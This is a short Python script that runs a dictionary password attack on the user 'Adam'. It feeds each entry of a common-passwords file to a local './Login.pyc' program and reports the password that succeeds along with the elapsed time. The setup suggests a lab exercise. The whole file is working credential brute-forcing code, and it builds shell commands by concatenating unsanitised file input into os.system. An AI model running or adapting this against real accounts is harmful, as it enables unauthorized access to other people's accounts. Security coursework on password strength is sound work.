import time
import os

if __name__ in '__main__':
    start_time = time.time()
    print("Start time: 0.0")
    common_passwords=[i.strip() for i in open('MostCommonPWs.txt')]

    for i in common_passwords:
        res = os.system('python3 ./Login.pyc'+ ' Adam ' + i + " >/dev/null 2>&1")
        if res == 0:
            print('Adam',i, "--- %s seconds ---" % (time.time() - start_time))
